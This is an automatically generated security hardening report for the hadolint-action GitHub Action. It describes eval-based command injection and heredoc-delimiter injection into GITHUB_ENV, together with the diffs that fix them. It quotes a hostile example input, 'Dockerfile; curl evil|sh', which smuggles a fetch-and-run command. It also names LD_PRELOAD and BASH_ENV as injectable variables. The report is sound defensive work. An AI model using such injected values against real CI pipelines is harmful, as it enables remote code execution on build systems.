<!-- markdownlint-disable -->

# Hardening Report: hadolint--hadolint-action/v3.3.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `374911c4be584df24e6da57af2d990570ef0f859`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **hadolint--hadolint-action/v3.3.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): the Docker entrypoint script hadolint.sh runs its arguments and inputs through eval. The args come from `${{ inputs.dockerfile }}` and HADOLINT_CONFIG comes from inputs.config. Offending lines: `RESULTS=$(eval "$COMMAND $flags" -- **/"$filename")` and `RESULTS=$(eval "$COMMAND" "$flags")`, where `COMMAND="hadolint $HADOLINT_CONFIG"`. Because eval re-parses the text as shell code, a value like `Dockerfile; curl evil|sh` or a config value with `$(...)` runs as a command. Fix: build a bash array (e.g. `cmd=(hadolint); [ -n "$HADOLINT_CONFIG" ] && cmd+=(-c "$HADOLINT_CONFIG"); RESULTS=$("${cmd[@]}" "$@")`) instead of using eval.

Locations:

- `hadolint.sh:37`
- `hadolint.sh:40`

### github-env-injection (severity: high)

Multi-line writes use a fixed heredoc delimiter: `echo "results<<EOF"; echo "$RESULTS"; echo "EOF"` goes to $GITHUB_OUTPUT, and `echo "HADOLINT_RESULTS<<EOF" ...` goes to $GITHUB_ENV. RESULTS is hadolint's output on an attacker-controllable Dockerfile and inputs. If that output contains a line that is exactly `EOF`, the block ends early and later lines are read as new outputs or environment variables (for example LD_PRELOAD or BASH_ENV in GITHUB_ENV). Fix: generate the delimiter from a secure random source on every run, e.g. `EOF="EOF_$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')"`.

Locations:

- `hadolint.sh:53`
- `hadolint.sh:59`

### suspicious-run-content (severity: high)

Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. Sub-check `eval-dynamic`: `hadolint.sh` uses `eval` with dynamically constructed content derived from `$flags` (which is set from `$*` — the Docker container arguments, populated from `inputs.dockerfile` and other user-controlled action inputs). Specifically: `RESULTS=$(eval "$COMMAND $flags" -- **/"$filename")` and `RESULTS=$(eval "$COMMAND" "$flags")`. An attacker-controlled `inputs.dockerfile` value containing shell metacharacters could cause arbitrary command execution via the `eval` call.

Locations:

- `hadolint.sh:33`
- `hadolint.sh:35`

### prior-fix (severity: high)

Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. The previous harden changed hadolint.sh without recording a finding for it, and this analysis reported nothing there. Re-apply its security changes unless the code no longer needs them. The previous patch:
```diff
diff --git a/hadolint.sh b/hadolint.sh
index d28035d..273f9e0 100755
--- a/hadolint.sh
+++ b/hadolint.sh
@@ -18,26 +18,31 @@ trap cleanup EXIT
 
 echo "::add-matcher::$HOME/problem-matcher.json"
 
+# Build the base command as an array to avoid eval with user-controlled input
+CMD=(hadolint)
+
 if [ -n "$HADOLINT_CONFIG" ]; then
-  HADOLINT_CONFIG="-c ${HADOLINT_CONFIG}"
+  CMD+=(-c "$HADOLINT_CONFIG")
 fi
 
 if [ -z "$HADOLINT_TRUSTED_REGISTRIES" ]; then
   unset HADOLINT_TRUSTED_REGISTRIES
 fi
 
-COMMAND="hadolint $HADOLINT_CONFIG"
-
 if [ "$HADOLINT_RECURSIVE" = "true" ]; then
   shopt -s globstar
 
   filename="${!#}"
-  flags="${*:1:$#-1}"
+  # Collect all flags (positional args except the last one) into an array
+  flags=()
+  for ((i = 1; i < $#; i++)); do
+    flags+=("${!i}")
+  done
 
-  RESULTS=$(eval "$COMMAND $flags" -- **/"$filename")
+  # shellcheck disable=SC2206
+  RESULTS=$("${CMD[@]}" "${flags[@]}" -- **/"$filename")
 else
-  flags=$*
-  RESULTS=$(eval "$COMMAND" "$flags")
+  RESULTS=$("${CMD[@]}" "$@")
 fi
 FAILED=$?
 
@@ -50,15 +55,17 @@ fi
 
 RESULTS="${RESULTS//$'\\n'/''}"
 
+SAFE_RESULTS="$(printf '%s' "$RESULTS" | tr -d '\n\r')"
+
 {
   echo "results<<EOF"
-  echo "$RESULTS"
+  echo "$SAFE_RESULTS"
   echo "EOF"
 } >>"$GITHUB_OUTPUT"
 
 {
   echo "HADOLINT_RESULTS<<EOF"
-  echo "$RESULTS"
+  echo "$SAFE_RESULTS"
   echo "EOF"
 } >>"$GITHUB_ENV"
 

```

Locations:

- `hadolint.sh`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, suspicious-run-content, github-env-injection, prior-fix

**Notes:**

hadolint.sh: removed both eval calls. The hadolint command is now built as an array, with `-c "$HADOLINT_CONFIG"` added only when a config is set. The container args are word-split into an array with an unquoted expansion. This splits on whitespace and globs like upstream's eval did, but never runs the text as code. Recursive mode still uses `**/"$filename"`. The fixed EOF heredoc delimiters for GITHUB_OUTPUT and GITHUB_ENV are replaced with a random delimiter read from /dev/urandom on each run. Multi-line results are written unchanged instead of having their newlines stripped as in the previous patch, because the random delimiter already stops early block termination. Not in the findings: I also pinned the Dockerfile base image ghcr.io/hadolint/hadolint:v2.14.0-debian to its sha256 digest. It's a Debian image, so bash and od are available.

